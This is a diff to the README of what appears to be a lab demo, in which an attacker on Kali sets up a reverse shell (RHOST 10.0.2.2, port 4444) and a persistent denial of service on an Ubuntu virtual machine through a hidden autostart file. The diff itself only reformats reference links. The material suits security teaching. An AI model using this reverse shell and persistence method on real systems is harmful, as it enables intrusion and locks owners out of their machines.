@@ -9,7 +9,7 @@ The goal of the demo is to create a persistent Denial of Service on an Ubuntu vi
 
 ## Kali Preparation
 First of all, all the necessary files were created on Kali.
-First, the `reverseshell.sh` file, where the is the [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl) in python 
+First, the `reverseshell.sh` file, where the is the [payload] in python 
 ```py
 export RHOST="10.0.2.2";
 export RPORT=4444;
@@ -78,7 +78,7 @@ To stop this attack you might think of deleting the `dos` executable, but in cas
 Alternatively, you could think of deleting the `dos.desktop` file, but given that it is located in a directory that is hidden by default and given that the terminal is unusable, this could be difficult.
 
 ## References
-1. [Payload for creating the reverse shell](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
+1. [Payload]: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
 2. [For the creation of the web file server, inspiration was taken from](https://medium.com/@jbtechmaven/ethical-hacking-reverse-shell-attack-using-metasploit-57e9cd400c88)
 3. [For usage of netcat, to make the attacker listen on a predefined port](https://www.geeksforgeeks.org/how-to-create-reverse-shells-with-netcat-in-kali-linux/)
 
